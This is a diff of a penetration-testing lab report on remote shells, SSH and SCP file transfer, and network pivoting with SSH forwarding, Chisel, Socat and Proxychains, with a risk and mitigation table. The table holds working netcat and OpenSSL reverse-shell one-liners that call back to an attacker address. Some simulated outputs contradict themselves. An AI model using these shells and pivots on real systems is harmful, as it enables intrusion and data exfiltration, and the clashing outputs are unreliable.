@@ -463,15 +463,458 @@ victim@target:~$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -qui
 Reverse shell established to 192.168.56.200:4444   # An encrypted reverse shell was successfully created
 
 ```
+### 8.3 SSH (Secure Shell)
+**Purpose:** The purpose of this exercise was to demonstrate how to establish secure remote access to a Linux system using the Secure Shell (SSH) protocol with two authentication methods: password-based authentication and key-based authentication. It aimed to show how an SSH server is started on a target machine and how an attacker/administrator machine can authenticate using credentials (username/password) or a private key file, highlighting the differences in usability and security between the two approaches.
+
+**Outcome:**
+The SSH service was successfully started on the victim machine, enabling remote connections. The attacker machine established a remote session using password authentication for the admin account, confirming that credential-based login was functional. A second connection was successfully established using key-based authentication for the user account with a private key file (user_key.pem), verifying that public-key authentication was properly configured. Both sessions provided interactive shell access, demonstrating that SSH can securely manage remote systems and that key-based authentication offers a password-less yet secure alternative for access control.
+```bash
+Victim Machine (192.168.1.100)
+Welcome to Ubuntu 20.04.3 LTS
+victim@target:~$
+
+victim@target:~$ systemctl start ssh          # The SSH service was started on the victim machine, enabling it to accept remote SSH connections
+
+● ssh.service - OpenBSD Secure Shell server
+   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
+   Active: active (running) since Mon 2021-12-13 10:30:15 UTC; 2s ago   # This confirmed the SSH server was running
+     Docs: man:sshd(8)
+           man:sshd_config(5)
+ Main PID: 1234 (sshd)
+    Tasks: 1 (limit: 4915)
+   CGroup: /system.slice/ssh.service
+           └─1234 /usr/sbin/sshd -D
+```
+```bash
+pentester@kali-linux:~$ ssh admin@192.168.1.100   # The attacker connected to the victim using SSH
+                                                  # with password-based authentication for the admin account
+
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-74-generic x86_64)
+
+Last login: Mon Dec 13 10:30:15 2021 from 192.168.1.50
+admin@192.168.1.100:~$                           # Successful login indicated password authentication worked
+
+```
+```bash
+pentester@kali-linux:~$ Welcome to the Kali Terminal Simulation!
+Type help to see available commands.
+pentester@kali-linux:~$ssh -i user_key.pem user@192.168.1.100
+# The attacker initiated an SSH connection using a private key file (user_key.pem)
+# -i specified the identity file for key-based authentication
+
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-74-generic x86_64)
+
+Last login: Mon Dec 13 10:30:15 2021 from 192.168.1.50
+user@192.168.1.100:~$                            # Successful login confirmed key-based authentication was configured
+
+user@192.168.1.100:~$ whoami                     # This command verified the identity of the logged-in account
+user                                             # Output confirmed access as the "user" account
+```
+### 8.4 Secure Copy Protocol (SCP)
+**Purpose:**
+The purpose of this exercise was to demonstrate secure file transfer between two Linux systems using the Secure Copy Protocol (SCP), which operates over SSH. The task focused on practicing both directions of transfer: uploading a file from the attacker machine to the victim machine and downloading a file from the victim back to the attacker. This illustrated how SCP leverages encrypted SSH channels to protect data in transit while performing remote file operations.
+
+**Outcome:**
+The SSH service was successfully started on the victim machine, enabling secure communication. A file (local_file.txt) was successfully uploaded from the attacker machine to the victim’s /tmp/ directory, confirming that outbound file transfer to a remote host was functional. The presence of the file on the victim system verified successful upload. Subsequently, a sensitive file (secret.txt) was successfully downloaded from the victim machine to the attacker’s local directory, demonstrating inbound file retrieval capability. Overall, the exercise confirmed that SCP can securely transfer files in both directions using encrypted connections, providing a reliable method for remote file management.
+
+```bash
+Victim Machine (192.168.1.100)
+Welcome to Ubuntu 20.04.3 LTS
+victim@target:~$
+victim@target:~$ systemctl start ssh          # The SSH service was started on the victim machine
+                                              # to allow secure remote connections and SCP transfers
+
+● ssh.service - OpenBSD Secure Shell server
+   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
+   Active: active (running) since Mon 2021-12-13 10:30:15 UTC; 2s ago   # This confirmed SSH was running successfully
+     Docs: man:sshd(8)
+           man:sshd_config(5)
+ Main PID: 1234 (sshd)
+    Tasks: 1 (limit: 4915)
+   CGroup: /system.slice/ssh.service
+           └─1234 /usr/sbin/sshd -D
+```
+```bash
+pentester@kali-linux:~$ scp local_file.txt admin@192.168.1.100:/tmp/
+# The attacker uploaded the file "local_file.txt" to the victim machine
+# using SCP over an encrypted SSH connection, targeting the /tmp directory
+
+local_file.txt 100% 1024 1.0MB/s 00:00   # Transfer completed successfully with full file copied
+```
+
+```bash
+victim@target:~$ ls                      # The victim listed files in the current directory
+remote_file.txt  config.conf  logs.txt  secret.txt  local_file.txt
+                                         # The uploaded file "local_file.txt" was visible,
+                                         # confirming the upload succeeded
+```
+```bash
+pentester@kali-linux:~$ ls               # The attacker listed local files before downloading
+local_file.txt  secret_data.txt  user_key.pem
+                                         # The target file "secret.txt" was not yet present locally
+
+pentester@kali-linux:~$ scp admin@192.168.1.100:/home/admin/secret.txt .
+# The attacker downloaded "secret.txt" from the victim’s home directory
+# The dot (.) indicated the file would be saved in the current local directory
+
+/home/admin/secret.txt 100%   44  1.0KB/s 00:00   # File download completed successfully
+
+pentester@kali-linux:~$ ls               # The attacker listed local files after downloading
+local_file.txt  secret_data.txt  user_key.pem secret.txt
+                                         # The target file "secret.txt" was successfully downloaded
+```
+### 8.5 SSH Dynamic Port Forwarding
+**Purpose:**
+The purpose of this exercise was to demonstrate how to use SSH dynamic port forwarding to create a local SOCKS proxy that securely tunnels traffic through a remote host. This technique enables access to internal network services that are otherwise unreachable and can bypass network restrictions by routing application traffic through an encrypted SSH connection. The lab aimed to show how a compromised or authorized remote machine can be used as a pivot point to explore internal resources while maintaining confidentiality of the transmitted data.
+
+  **Explanation of the IP Address Differences**
+
+- Direct request (curl https://ifconfig.me) → 203.0.113.45
+This was the attacker machine’s public internet IP address. The request went directly to the internet without using the proxy.
+
+- Proxied request (curl --socks5 localhost:1080 https://ifconfig.me) → 192.168.1.100
+This indicated that the request was routed through the SSH tunnel and originated from the victim machine. The external service therefore saw the victim’s address instead of the attacker’s
+
+**Outcome:**
+The SSH service was successfully started on the victim machine, allowing remote connections. The attacker established an SSH session with dynamic port forwarding enabled (-D 1080), which created a local SOCKS proxy on the attacker’s machine at localhost:1080. Using this proxy, the attacker successfully accessed an internal web service (internal-web.local) that was not directly reachable, confirming that traffic was being routed through the victim host. IP address checks further validated the tunneling effect: a direct request revealed the attacker’s public IP address (203.0.113.45), while the proxied request showed the victim’s internal IP address (192.168.1.100), proving that outbound traffic originated from the victim machine. Overall, the exercise demonstrated how SSH dynamic forwarding enables secure pivoting, anonymity, and controlled access to internal network resources through encrypted tunnels.
+
+```bash
+Victim Machine (192.168.1.100)
+Welcome to Ubuntu 20.04.3 LTS
+victim@target:~$
+victim@target:~$ systemctl start ssh
+# Started the SSH service to allow remote connections
+
+● ssh.service - OpenBSD Secure Shell server
+   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
+   Active: active (running) since Mon 2021-12-13 10:30:15 UTC; 2s ago
+# Confirmed SSH server was running
+```
+```bash
+pentester@kali-linux:~$ ssh -D 1080 admin@192.168.1.100
+# Connected to the victim via SSH with dynamic port forwarding
+# Created a local SOCKS proxy on localhost:1080
+
+Dynamic forwarding established on localhost:1080
+admin@192.168.1.100:~$
+
+admin@192.168.1.100:~$ curl --socks5 localhost:1080 http://internal-web.local
+# Accessed an internal-only website through the SOCKS proxy
+
+HTTP/1.1 200 OK
+# Successful response confirmed proxy-based access to internal service
+
+admin@192.168.1.100:~$ curl https://ifconfig.me 
+203.0.113.45
+# Direct request showed the attacker’s public IP address (no proxy)
+
+
+admin@192.168.1.100:~$ curl --socks5 localhost:1080 https://ifconfig.me
+192.168.1.100
+# Proxied request showed the victim’s IP address
+# Traffic originated from the victim through the SSH tunnel
+
+```
+### 8.6 SSH Local & Remote Port Forwarding
+**Purpose:**
+To demonstrate how SSH local and remote port forwarding can securely expose and access internal services across networks. The exercise aimed to show how a user could tunnel traffic through an SSH connection to reach services that were otherwise inaccessible directly.
+
+**Outcome:**
+Local port forwarding successfully allowed access to the internal web service on port 80 through localhost:8080, confirming that traffic was securely tunneled via SSH. Remote port forwarding also succeeded, exposing the attacker’s SSH service on the victim machine at port 2222. Overall, both tunneling techniques worked as intended, enabling secure communication with internal resources.
+
+```bash
+Victim Machine (192.168.1.100)
+Welcome to Ubuntu 20.04.3 LTS
+victim@target:~$
+victim@target:~$ systemctl start ssh
+● ssh.service - OpenBSD Secure Shell server
+   Active: active (running) since Mon 2021-12-13 10:30:15 UTC; 2s ago
+# SSH service started successfully on the victim machine
+# The system is now ready to accept remote SSH connections
+
+victim@target:~$
+victim@target:~$ nc -l -p 80
+Listening on [0.0.0.0] (family 0, port 80)
+Internal service listener started on port 80
+# Netcat started a simple service listening on port 80 (HTTP)
+# This simulates an internal web service on the victim machine
+```
+
+```bash
+pentester@kali-linux:~$ ssh -L 8080:internal-web.local:80 admin@192.168.1.100
+Welcome to Ubuntu 20.04.3 LTS
+Local port forwarding established: localhost:8080 -> internal-web.local:80
+admin@192.168.1.100:~$
+# SSH connection established from attacker machine to victim
+# Local port 8080 on attacker now forwards traffic to port 80 on internal host
+# Accessing http://localhost:8080 will reach the internal web service
+
+```
+
+```bash
+victim@target:~$
+victim@target:~$ netstat -tlnp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address    Foreign Address  State   PID/Program name
+tcp        0      0 0.0.0.0:22       0.0.0.0:*        LISTEN  1234/sshd
+tcp        0      0 0.0.0.0:2222     0.0.0.0:*        LISTEN  1234/sshd
+# Port 22 → SSH service listening normally
+# Port 2222 → Opened due to remote port forwarding
+# Shows that SSH is accepting connections on both ports
+
+```
+```bash
+admin@192.168.1.100:~$ ssh -R 2222:localhost:22 admin@192.168.1.100
+Welcome to Ubuntu 20.04.3 LTS
+Remote port forwarding established: 192.168.1.100:2222 -> localhost:22
+admin@192.168.1.100:~$
+# Remote port forwarding created
+# Port 2222 on the victim machine now forwards to port 22 on the client machine
+# This allows the remote system to SSH back into the attacker's machine
+
+```
+```bash
+admin@192.168.1.100:~$ curl http://localhost:8080
+HTTP/1.1 200 OK
+Content-Type: text/html
+# HTTP request succeeded through the SSH tunnel
+# Confirms local port forwarding is working
+
+<!DOCTYPE html>
+<html>
+<head><title>Internal Service</title></head>
+<body>
+<h1>Welcome to Internal Service</h1>
+<p>Successfully accessed through SSH local port forwarding!</p>
+</body>
+</html>
+# The internal web page was retrieved successfully
+# Demonstrates access to an internal service via the forwarded port
+
+```
+### 8.7 Advanced Tunneling with Chisel & Socat
+**Purpose:**
+
+**Chisel:** Chisel used to create secure tunnels over HTTP/HTTPS, especially reverse tunnels, to access internal services across firewalls or restricted networks (network pivoting and remote access).
+
+**Socat:** Socat is used as a versatile port forwarder and relay tool to connect two network endpoints, enabling traffic redirection, tunneling, and access to internal services through specific ports.
+
+The purpose of this exercise was to demonstrate advanced network tunneling techniques using Chisel and Socat to enable access to internal services across restricted networks. It aimed to show how Chisel can create secure reverse tunnels over HTTP/HTTPS to bypass firewalls and pivot into internal environments, while Socat can relay traffic between ports to forward connections to otherwise unreachable services. The exercise highlighted how these tools are used in penetration testing and system administration to maintain connectivity, bypass network controls, and expose internal applications securely.
+
+**Outcome:**
+A Chisel server was successfully launched on the victim machine with reverse tunneling enabled, and the attacker machine established a Chisel client connection that created a tunnel from the attacker’s localhost to an internal web service on the victim network. This confirmed that Chisel can securely expose internal services through restricted network boundaries. Additionally, a Socat listener was configured to forward traffic from a local port to an internal API service, demonstrating effective port relaying. Testing with a web request verified that the internal service was reachable through the established tunnels. Overall, both tools successfully enabled access to internal resources, demonstrating their effectiveness for network pivoting, firewall bypass, and controlled remote access.
+
+```bash
+# ===================== Victim Machine Chisel Server =====================
+
+
+Victim Machine (192.168.1.100)
+Welcome to Ubuntu 20.04.3 LTS
+victim@target:~$ 
+victim@target:~$ chisel server --port 8080 --reverse
+2021/12/13 10:30:15 server: Reverse tunnelling enabled
+2021/12/13 10:30:15 server: Listening on :8080
+2021/12/13 10:30:15 server: Ready to accept connections
+victim@target:~$ 
+# Reverse tunneling mode was enabled, allowing clients to expose services back through the server.
+# Chisel server was successfully bound to port 8080 and is awaiting connections.
+# Server initialization completed; it is ready for client tunnels.
+
+```
+
+```bash
+
+# ===================== Attacker Machine — Chisel Client =====================
+
+pentester@kali-linux:~$ chisel client 192.168.1.100:8080 R:8080:internal-web.local:80
+2021/12/13 10:30:15 client: Connected to 192.168.1.100:8080
+2021/12/13 10:30:15 client: Tunnel established: localhost:8080 -> internal-web.local:80
+2021/12/13 10:30:15 client: Ready to accept connections
+# Client successfully established a control connection to the Chisel server.
+# Reverse tunnel created: local port 8080 now forwards traffic to the internal web service on port 80.
+# Tunnel is active and ready to proxy traffic.
+
+```
+```bash
+# ===================== Attacker Machine — Socat Tunnel =====================
+
+pentester@kali-linux:~$ socat TCP-LISTEN:9090,fork TCP:internal-api.local:8080
+socat: listening on port 9090, forwarding to internal-api.local:8080
+# Socat is acting as a relay, forwarding connections from local port 9090 to the internal API service.
+
+socat: accepting connection from any host on port 9090
+# Socat is actively waiting for incoming connections; 'fork' allows multiple simultaneous sessions.
+
+```
+```bash
+# ===================== Tunnel Test =====================
+
+pentester@kali-linux:~$ curl http://localhost:8080
+HTTP/1.1 200 OK
+# Successful HTTP response confirms the tunnel is working.
+
+Content-Type: text/html
+
+<!DOCTYPE html>
+<html>
+<head><title>Internal Service</title></head>
+<body>
+<h1>Welcome to Internal Service</h1>
+<p>Successfully accessed through advanced tunneling!</p>
+</body>
+</html>
+# Internal web application content retrieved via the Chisel tunnel.
+
+pentester@kali-linux:~$
+```
+
+### 8.8 Proxychains - Universal Proxy Routing
+**Purpose:**
+The purpose of this exercise was to demonstrate how to route application traffic through a SOCKS proxy using SSH dynamic port forwarding and Proxychains. It aimed to show how a secure tunnel can be created to pivot into an internal network and force external tools (such as Nmap and Curl) to operate through that tunnel. This technique is commonly used to access internal services that are otherwise unreachable and to mask the true origin of network traffic by sending it through an intermediary host.
+
+**Outcome:**
+The SSH service was successfully started on the victim machine, allowing remote connections. A SOCKS proxy was created on the attacker machine using SSH dynamic port forwarding (-D 1080), providing a local proxy endpoint. Proxychains was verified to be correctly configured to use this proxy (127.0.0.1:1080). Network scanning with Nmap was successfully routed through the proxy, enabling discovery of the internal web service (internal-web.local) that would normally be inaccessible. Additionally, external IP testing confirmed that traffic sent through the proxy originated from the victim machine rather than the attacker machine. This demonstrated successful network pivoting, anonymization of tool traffic, and controlled access to internal resources through a secure SSH tunnel.
+
+```bash
+Victim Machine (192.168.1.100)
+Welcome to Ubuntu 20.04.3 LTS
+victim@target:~$ 
+victim@target:~$ systemctl start ssh
+● ssh.service - OpenBSD Secure Shell server
+   Active: active (running) since Mon 2021-12-13 10:30:15 UTC; 2s ago
+# SSH server started successfully; system is now ready to accept remote SSH connections.
+
+victim@target:~$
+```
+
+```bash
+pentester@kali-linux:~$ ssh -D 1080 admin@192.168.1.100
+Welcome to Ubuntu 20.04.3 LTS
+Dynamic forwarding established on localhost:1080
+# SSH dynamic port forwarding created a SOCKS proxy on the attacker's machine at 127.0.0.1:1080.
+
+admin@192.168.1.100:~$ 
+```
+```bash
+admin@192.168.1.100:~$ cat /etc/proxychains.conf
+
+# proxychains.conf  VER 4.x
+#
+#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
+#
+
+# The option below identifies how the ProxyList is treated.
+# only one option should be uncommented at time,
+# otherwise the last appearing option will be accepted
+#
+#dynamic_chain
+#
+# Dynamic - Each connection will be done via chained proxies
+# all proxies chained in the order as they appear in the list
+# at least one proxy must be online to play in chain
+# (dead proxies are skipped)
+# otherwise EINTR is returned to the app
+#
+strict_chain
+#
+# Strict - Each connection will be done via chained proxies
+# all proxies chained in the order as they appear in the list
+# all proxies must be online to play in chain
+# otherwise EINTR is returned to the app
+#
+#random_chain
+#
+# Random - Each connection will be done via random proxy
+# (or proxy chain, see  chain_len) from the list.
+# this option is good to test your IDS :)
+
+# Make sense only if random_chain
+#chain_len = 2
+
+# Quiet mode (no output from library)
+#quiet_mode
+
+# Proxy DNS requests - no leak for DNS data
+proxy_dns
+
+# Some timeouts in milliseconds
+tcp_connect_time_out 8000
+tcp_read_time_out 8000
+
+# ProxyList format
+#       type  host  port [user pass]
+#       (values separated by 'tab' or 'blank')
+#
+#
+#        Examples:
+#
+#            	socks5	192.168.67.78	1080	lamer	secret
+#		http	192.168.89.3	8080	justu	hidden
+#	 	socks4	192.168.1.49	1080
+#	        http	192.168.39.93	8080
+#
+#
+#       proxy types: http, socks4, socks5
+#        ( auth types: user/pass )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 127.0.0.1 1080
+
+# Proxychains will route traffic through the local SOCKS5 proxy created by SSH.
+```
+```bash
+admin@192.168.1.100:~$ proxychains nmap -sT -p 80 internet-web.local
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  OK
+# Proxychains successfully routed Nmap traffic through the SOCKS proxy.
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-13 10:30 UTC
+Nmap scan report for internal-web.local (192.168.1.200)
+Host is up (0.001s latency).
+# Internal host responded, confirming pivot access into the internal network.
+
+PORT   STATE SERVICE
+80/tcp open  http
+# HTTP service on port 80 is reachable through the proxy tunnel.
+
+
+Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds
+
+admin@192.168.1.100:~$ curl https://ifconfig.me
+203.0.113.45
+# Public IP shown is the attacker's normal external IP because this request did NOT use Proxychains.
+
+admin@192.168.1.100:~$
+```
+
 ## 9. Findings and Risk Table
-| **Tool Used** | **Technique Type** | **Command(s) Executed** | **Key Output / Observed Result** | **Insight Gained** | **Risk Level** | **Lessons Learned** | **Recommended Action / Mitigation** | **Conclusion** |
-| --- | --- | --- | --- | --- | --- | --- | --- | --- |
-| **Netcat (nc)** | Bind Shell (Victim listening, attacker connects) | `nc -l -p 4444 -e /bin/bash` (victim) `nc 192.168.56.210 4444` (attacker) | Attacker gained remote shell on victim; executed user, network, and file enumeration commands | A single exposed port allowed unrestricted command execution | **High** | Unprotected listening services enable instant system takeover | Block unauthorized listeners; enforce host firewalls; restrict shell binaries; enable monitoring | Demonstrated how bind shells grant full compromise with no authentication |
-| **Netcat (nc)** | System enumeration via bind shell | Commands: `id`, `whoami`, `pwd`, `ls`, `ifconfig`, `uname`, `ps`, `netstat` | Revealed OS version, user identity, directory structure, network details, and active processes | Attackers gather intelligence within seconds after gaining a shell | **High** | Enumeration is the first stage for privilege escalation and pivoting | Implement least privilege, encrypt data at rest, enforce logging and alerts for suspicious commands | Enumeration proved how rapidly an attacker maps the environment once access exists |
-| **Netcat (nc)** | Network visibility discovery | `netstat`, `ifconfig` | Displayed active TCP session and victim network configuration | Internal address space details exposed to attacker | **High** | Internal network mapping increases likelihood of lateral movement | Segmentation, IDS deployment, outbound traffic filtering | Shell access enabled deeper network scouting beyond initial compromise |
-| **Netcat (nc)** | Reverse Shell (Attacker listens, victim connects back) | Attacker: `nc -lvp 4444` Victim: `nc 192.168.56.200 4444 -e /bin/bash` | Attacker received reverse shell despite firewall rules | Outbound traffic allowed remote access bypassing inbound filtering | **Critical** | Firewalls protecting inbound ports are ineffective without egress controls | Restrict outbound connections, enforce proxy rules, monitor unusual traffic | Reverse shells demonstrated how attackers bypass security boundaries by forcing the victim to initiate connection |
-| **Netcat (nc)** | Recon via reverse shell | `uname`, `whoami`, `pwd`, `ps`, `netstat` | Provided attacker system intelligence identical to bind shell | Reverse channel offers same privileges, executed covertly | **High** | Reverse shells are stealthier and harder to detect than bind shells | Deploy behavioral monitoring, disable unnecessary tools, enforce endpoint protection | Proved that reverse tunnels maintain access even with stricter network controls |
-| **Netcat (nc)** | Session termination handling | `exit` closed both sessions | Sessions closed immediately once attacker exited | No persistence mechanism existed | **Low** | Shells are temporary unless persistence is manually installed | Monitor logs for session start/end anomalies; disable netcat by policy | Shell closure demonstrated how attackers require persistence for lasting access |
+| **Tool Used**      | **Technique Type**                                | **Command(s) Executed**                                                                                                                                                                                      | **Key Output / Observed Result**                               | **Insight Gained**                                           | **Risk Level** | **Lessons Learned**                                                     | **Recommended Action / Mitigation**                                                              | **Conclusion**                                               |
+|--------------------|-------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------|-------------------------------------------------------------|----------------|-------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------|--------------------------------------------------------------|
+| **Netcat (nc)**    | Bind Shell (Victim listening, attacker connects) | `nc -l -p 4444 -e /bin/bash` (victim) • `nc 192.168.56.210 4444` (attacker)                                                                                                                                | Attacker gained remote shell and executed enumeration commands | A single exposed port allowed unrestricted command execution | **High**       | Unprotected listeners enabled instant system takeover                   | Block unauthorized listeners; enforce host firewalls; restrict shell binaries; enable monitoring | Bind shells granted full compromise with no authentication   |
+| **Netcat (nc)**    | System enumeration via shell                     | `id`, `whoami`, `pwd`, `ls`, `ifconfig`, `uname`, `ps`, `netstat`                                                                                                                                            | OS, user, directory, network, and process details were exposed | Attackers gathered intelligence within seconds               | **High**       | Enumeration was the first step toward privilege escalation and pivoting | Enforce least privilege; enable logging and alerts for suspicious commands                       | Rapid environment mapping occurred once shell access existed |
+| **Netcat (nc)**    | Reverse Shell (Attacker listens, victim connects) | `nc -lvp 4444` (attacker) • `nc 192.168.56.200 4444 -e /bin/bash` (victim)                                                                                                                               | Attacker received shell through outbound connection            | Outbound traffic bypassed inbound firewall protections       | **Critical**   | Inbound filtering alone was ineffective without egress controls         | Restrict outbound traffic; monitor unusual connections                                           | Reverse shells bypassed traditional firewall rules           |
+| **Netcat (nc)**    | File Transfer                                    | `nc -l -p 4444 > cert.pem` (victim) • `nc 192.168.56.210 4444 < cert.pem` (attacker)                                                                                                                      | Certificate file was transferred successfully                  | Netcat functioned as a simple file transfer tool             | **Medium**     | Networking tools could be abused for covert data movement               | Monitor unusual port usage; restrict unauthorized tools                                          | Demonstrated file exfiltration using common utilities        |
+| **OpenSSL**        | Certificate & Key Generation                     | `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes`                                                                                                                         | Self‑signed certificate and private key were created           | Attackers could generate encryption materials quickly        | **Medium**     | Secure channels could be prepared in minutes                            | Monitor key generation activity; restrict unnecessary OpenSSL use                                | Encryption setup required no elevated privileges             |
+| **OpenSSL**        | Encrypted Reverse Shell                          | `openssl s_server -quiet -key key.pem -cert cert.pem -port 4444` (attacker) • `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 \| openssl s_client -quiet -connect 192.168.56.200:4444 > /tmp/s; rm /tmp/s` (victim) | Encrypted reverse shell established over TLS                   | Command traffic was hidden inside encrypted channel          | **Critical**   | Encrypted shells were stealthier than plaintext shells                  | Use EDR, behavior analytics, restrict shell execution                                            | Demonstrated covert command‑and‑control via TLS              |
+| **SSH**            | Password Authentication                          | `systemctl start ssh` (victim) • `ssh admin@192.168.1.100` (attacker)                                                                                                                                       | Remote login succeeded using password                          | Credentials alone enabled full remote access                 | **High**       | Weak or reused passwords risk compromise                                | Enforce strong passwords; MFA; limit SSH exposure                                                | Password‑based SSH can be secure but is attack‑prone         |
+| **SSH**            | Key‑Based Authentication                         | `ssh -i user_key.pem user@192.168.1.100`                                                                                                                                                                    | Password‑less secure login succeeded                           | Private keys provided stronger authentication                | **Medium**     | Key management is critical for security                                 | Protect private keys; disable password login where possible                                      | Public‑key auth improves security when properly managed      |
+| **SCP (SSH)**      | Secure File Upload                               | `scp local_file.txt admin@192.168.1.100:/tmp/`                                                                                                                                                               | File successfully transferred to victim                        | SSH channels enable secure data transfer                     | **Medium**     | Legitimate tools can be used for exfiltration                           | Monitor file transfers; apply DLP controls                                                       | Secure copy can move sensitive data unnoticed                |
+| **SCP (SSH)**      | Secure File Download                             | `scp admin@192.168.1.100:/home/admin/secret.txt .`                                                                                                                                                           | Sensitive file retrieved from victim                           | Attackers can extract data over encrypted channels           | **High**       | Encrypted transfers evade simple monitoring                             | Inspect outbound traffic; restrict SSH where unnecessary                                         | Demonstrated secure data exfiltration                        |
+| **SSH**            | Dynamic Port Forwarding (SOCKS Proxy)            | `ssh -D 1080 admin@192.168.1.100` • `curl --socks5 localhost:1080 http://internal-web.local`                                                                                                                | Internal service accessed through proxy                        | SSH can pivot into internal networks                         | **High**       | Single foothold enables broad network access                            | Restrict SSH tunneling; monitor unusual proxy behavior                                           | Dynamic forwarding enabled stealthy lateral movement         |
+| **SSH**            | Proxy IP Masking Test                            | `curl https://ifconfig.me` • `curl --socks5 localhost:1080 https://ifconfig.me`                                                                                                                             | Different IPs observed (public vs victim)                      | Traffic origin can be hidden via proxy                       | **Medium**     | Attribution becomes difficult                                           | Monitor anomalous outbound routes                                                                | Proxies can obscure attacker location                        |
+| **SSH**            | Local Port Forwarding                            | `ssh -L 8080:internal-web.local:80 admin@192.168.1.100` • `curl http://localhost:8080`                                                                                                                      | Internal web service accessed locally                          | Internal services exposed externally                         | **High**       | Port forwarding bypasses segmentation                                   | Disable port forwarding where not needed                                                         | Local tunnels expose protected resources                     |
+| **SSH**            | Remote Port Forwarding (Reverse Tunnel)          | `ssh -R 2222:localhost:22 admin@192.168.1.100`                                                                                                                                                               | Remote system exposed attacker’s SSH port                      | External access created into attacker network                | **High**       | Reverse tunnels bypass NAT/firewalls                                    | Monitor listening ports; restrict SSH options                                                    | Enables hidden backdoor access paths                         |
+| **Chisel**         | Reverse Tunneling / Pivoting                     | `chisel server --port 8080 --reverse` (victim) • `chisel client 192.168.1.100:8080 R:8080:internal-web.local:80`                                                                                            | Tunnel established to internal web service                     | HTTP‑based tunnels bypass many defenses                      | **High**       | Specialized tools enable stealth pivoting                               | Detect unusual persistent connections                                                            | Chisel enabled access to internal services                   |
+| **Socat**          | TCP Relay Tunnel                                 | `socat TCP-LISTEN:9090,fork TCP:internal-api.local:8080`                                                                                                                                                     | Local port forwarded to internal API                           | Generic tools can replicate tunneling functions              | **High**       | Simple utilities can enable powerful pivots                             | Monitor port listeners; restrict tool availability                                               | Socat provided flexible traffic redirection                  |
+| **Proxychains**    | Tool Routing Through Proxy                       | `cat /etc/proxychains.conf` • `proxychains nmap -sT -p 80 internal-web.local`                                                                                                                               | Nmap scan succeeded through SOCKS proxy                        | Any tool can operate through tunnels                         | **High**       | Pivoting extends attacker reach significantly                           | Monitor scanning activity; block unauthorized proxies                                            | Proxychains enabled reconnaissance inside network            |
+| **Proxychains**    | External IP Check via Proxy                      | `proxychains curl https://ifconfig.me`                                                                                                                                                                      | IP reflected proxy/victim address                              | Proxy concealed true origin of traffic                       | **Medium**     | Identity masking complicates detection                                  | Use anomaly detection and logging                                                                | Demonstrated anonymized outbound communication               |
+| **Multiple Tools** | Session Termination                              | `exit`                                                                                                                                                                                                      | Sessions closed without persistence                            | Access lost after termination                                | **Low**        | Persistence required for long‑term control                              | Monitor session logs; harden systems                                                             | Temporary shells highlighted need for persistence            |
+
 
 ## 10. Troubleshooting
 When commands failed or services did not respond:
@@ -483,32 +926,27 @@ When commands failed or services did not respond:
 This ensured tool execution remained within the designated training environment.
 ## 11. Summary and Lesson Learnt
 ### Summary
-  - In this lab, Netcat was used to demonstrate how bind shells and reverse shells could be established between a victim and an attacker, resulting in unauthorized remote command execution. A listening service was configured on the victim system in the bind shell scenario, while in the reverse shell scenario, the victim system was made to initiate a connection back to the attacker. In both cases, shell access was successfully obtained without authentication.
-
-- System and network enumeration commands were executed through the established shells, revealing critical information such as operating system details, user identity, running processes, directory structures, and internal network configurations. It was observed that once shell access was gained, reconnaissance of the environment was performed within seconds.
-
-- It was further observed that firewall protections focused only on inbound traffic were ineffective against reverse shell connections, as outbound traffic was allowed without restriction. Even in environments where certain commands were unavailable, sufficient functionality remained to allow effective exploitation. The sessions were terminated upon exit, showing that persistence had not been established during the exercise.
+During this lab exercise, a variety of tools and techniques were employed to simulate penetration testing and network pivoting. Initial access was achieved using Netcat bind and reverse shells, as well as OpenSSL‑based encrypted shells, highlighting how attackers can bypass firewall rules and use encrypted channels for stealth. SSH was used to demonstrate both password and key-based authentication, along with SCP for secure file transfer. Advanced tunneling techniques were practiced using SSH dynamic, local, and remote port forwarding, Chisel, and Socat, enabling access to internal services and creation of persistent tunnels. Proxychains was configured to route traffic through SOCKS proxies, demonstrating obfuscation of attack traffic and IP masking. Overall, the exercises showcased how common system tools can be abused for access, pivoting, data exfiltration, and stealthy network operations.
 
 ### Lessons Learned
+1. Exposed Services Are High-Risk: Even a single open port like SSH or Netcat can allow complete system compromise if not properly secured.
 
-- It was learned that a single exposed listening port was sufficient to allow complete system compromise.
+2. Reverse Shells Bypass Firewalls: Outbound connections from the victim can circumvent inbound firewall rules, emphasizing the need for egress monitoring.
 
-- It was observed that reverse shells bypassed traditional firewall protections when outbound traffic filtering was not enforced.
+3. Encryption Can Hide Malicious Activity: Tools like OpenSSL can conceal data transfers and reverse shells, making detection challenging without deep inspection.
 
-- It was demonstrated that system and network enumeration could be performed rapidly after gaining shell access.
+4. SSH Keys vs Passwords: Key-based authentication offers stronger security but must be protected; password-based authentication can be brute-forced or reused.
 
-- It was noted that partial command restrictions did not prevent exploitation when full shell access was still available.
+5. Tunneling Enables Pivoting: SSH port forwarding, Chisel, and Socat can expose internal resources, demonstrating the risk of internal network traversal.
 
-- It was identified that internal network information was easily exposed through basic commands such as ifconfig and netstat, increasing the risk of lateral movement.
+6. Proxychains Masks Traffic: Routing tools through SOCKS proxies can obfuscate attacker activity and IP origin, complicating monitoring.
 
-- It was understood that shell sessions were temporary but could have been made persistent by an attacker within a short time.
